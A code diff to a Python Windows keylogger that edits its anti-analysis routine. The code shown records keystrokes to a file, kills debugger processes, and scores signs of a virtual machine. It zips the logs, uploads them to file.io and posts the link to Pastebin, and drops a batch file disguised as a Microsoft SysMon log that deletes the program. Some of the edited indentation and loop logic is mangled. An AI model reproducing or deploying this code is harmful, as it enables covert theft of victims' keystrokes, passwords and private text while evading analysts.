@@ -20,9 +20,7 @@ from pastebin_python import PastebinPython
 from pastebin_python.pastebin_exceptions import *
 from pastebin_python.pastebin_constants import *
 from pastebin_python.pastebin_formats import *
-
 pbin  = PastebinPython(api_dev_key='###---YOUR API KEY HERE---###')
-
 """
 ###--NOT IMPLEMENTED IN BASE LOGGER---###
 
@@ -116,7 +114,6 @@ def cmdline(command):
 
 """
 Here we have some anti-forensic measures.
-
 We will assign points for types of obstacles we may come across.
 We check for debugger processes, OS uptime, drive size among other
 things in order to try to figure out wether we are being executed
@@ -154,7 +151,7 @@ def risk():
 
     # Tally risk score
     if total_free < 40:
-	risk_score += 5
+	    risk_score += 5
 
     # Clock
     ran_int = random.randint(1,21)*5
@@ -181,54 +178,38 @@ def risk():
     DBG_out = []
 
     for proc in psutil.process_iter():
-	if proc.name() in DebugList:
-	    #print(proc)
+        if proc.name() in DebugList:
+            #print(proc)
             DBG = True
+            try:
+	            p = psutil.Process(proc.pid)
+	            time.sleep(0.33)
+	            p.kill()
+	            
+            except Exception as e:
+	            #print e
+	            DBG_out.append(proc)
+	            continue
 
-	    try:
-		p = psutil.Process(proc.pid)
-		time.sleep(0.33)
-		p.kill()
-	    except Exception as e:
-		#print e
-		DBG_out.append(proc)
-		continue
+        elif proc.name() in VMProcessList:
+	        #print(proc)
+	        VM = True
+        continue
 
-	elif proc.name() in VMProcessList:
-	     #print(proc)
-	     VM = True
-
-            continue
-
-	"""
-	If there were DBG procs check to see
-	if we managed to kill them all by counting
-	the number of items in the DBG_out array
-
-	In case it's empty assume we killed all
-	and switch DBG back to False
-	"""
-	cnt = 0
-	for i in DBG_out:
-	    cnt += 1
-
-	if not cnt < 1:
-	    DBG = False
-
-	if DBG and VM == True:
-	    risk_score += 15
-	    return risk_score
-
-	elif DBG == True:
-	    risk_score += 12
-	    return risk_score
-
-	elif VM == True:
-	    risk_score += 11
-	    return risk_score
-
-	else:
-	    return risk_score
+    """	If there were DBG procs check to see if we managed to kill them all by counting the number of items in the DBG_out array
+	In case it's empty assume we killed all and switch DBG back to False """
+    cnt = 0
+    for i in DBG_out:
+        cnt += 1
+        if not cnt < 1:
+            DBG = False
+            if DBG and VM == True:
+            	risk_score += 15
+            elif DBG == True:
+                risk_score += 12
+            elif VM == True:
+                risk_score += 11
+    return risk_score
 
 """
 Main logger logic starts here
@@ -253,9 +234,9 @@ def IsKeyPressed(VK_KEYCODE):
         try:
             VK_KEYCODE = StringToVK(VK_KEYCODE)
         except Exception as e:
-	    if debug:
-	        e = "Exception caught in sub: 'IsKeyPressed' arg VK_KEYCODE is invalid"
-		sys.exit(e)
+            if debug:
+                e = "Exception caught in sub: 'IsKeyPressed' arg VK_KEYCODE is invalid"
+                sys.exit(e)
         return
 
     return windll.user32.GetKeyState(c_int(VK_KEYCODE)) & 0x8000 != 0
@@ -323,7 +304,7 @@ class KeyTracker:
             SetKeyState(key, state)
 
     def CompileData(self):
-	outfile = open("data.txt", "a")
+        outfile = open("data.txt", "a")
         outfile.write("\n")
         outfile.write("-"*15)
         outfile.write("\n")
@@ -334,13 +315,10 @@ class KeyTracker:
         def CompileData(self):
             # Create zipped file contents
             contents = "\n%s\n%s" % ('-'*15, self.tracked_string_concat)
-
             with ZipFile("data.zip", "w") as zip:
 	        zip.writestr('data.txt', contents)
-
             url = upload('fileio', 'data.zip')
 	    result = pbin.CreatePaste(url,"link.txt","cil", 1, "1H")
-
          """
          ###--NOT IMPLEMENTED IN BASE LOGGER---###
 
@@ -368,14 +346,11 @@ def selfdestruct():
     filename = executable.split("\\")[-1]
     data = '''@echo off
 REM Microsoft(tm) --- SysMon task log
-
 TASKKILL /F /IM "{0}"
 break>{0}
 DEL -f "{0}"
 break>"%~f0" && DEL "%~f0"
-
 REM EOF --- End Of File
-
 echo sysmon >> {0}'''.format( filename )
     f = open("sysmon.bat","w")
     f.write(data)
@@ -387,25 +362,25 @@ if __name__ == "__main__":
     if risk == 25:
 	# All checks report risk
 	# Restricted: Terminate
-	selfdestruct()
+	    selfdestruct()
     elif risk == 17:
 	# Flag for DBG proc, flag for VM indicator
 	# Restricted: Terminate
-	selfdestruct()
+	    selfdestruct()
     elif risk == 16:
 	# Flag for VM proc, flag for VM indicator
 	# Restricted: Terminate.
-	selfdestruct()
+	    selfdestruct()
     elif risk == 10:
 	# Two VM indicator flags
 	# Moderate risk: User Discretion
-	# selfdestruct()
+	    selfdestruct()
     elif risk == 5:
+        selfdestruct()
 	# One VM indicator
 	# Low risk: User Discretion
-	# selfdestruct()
-    else risk == 0:
+    else:
+	    start()
 	# No indicators
 	# Of course, this just means we were unable
 	# To find indicators, not that we are 100% safe.
-	start()
